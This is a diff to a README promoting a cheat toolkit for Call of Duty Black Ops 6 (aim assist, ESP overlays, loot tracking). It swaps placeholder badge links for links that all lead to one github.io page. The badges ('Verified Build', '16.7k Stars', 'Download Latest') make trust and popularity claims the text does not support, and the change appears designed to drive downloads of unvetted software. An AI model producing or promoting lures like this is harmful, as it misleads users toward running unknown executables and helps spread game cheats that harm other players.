@@ -23,10 +23,10 @@ The Cheat software is an **all-in-one toolkit** for gameplay customization. From
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 16.7k Stars](https://img.shields.io/badge/Community-16.7k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
+[![⭐️ 16.7k Stars](https://img.shields.io/badge/Community-16.7k_Stars-green?logo=github\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
 
 ---
 
@@ -158,8 +158,8 @@ A: Yes, press the master toggle (`F12`) to disable all features.
 
 The **CoD Black Ops 6 Cheat** combines **aim assist precision, ESP overlays, and loot/objective tracking** into one versatile toolkit. Whether you’re practicing, grinding, or climbing ranks, it ensures consistent accuracy and full map awareness.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://cod-black-ops-6-cheat.github.io/.github/)
 
 ---
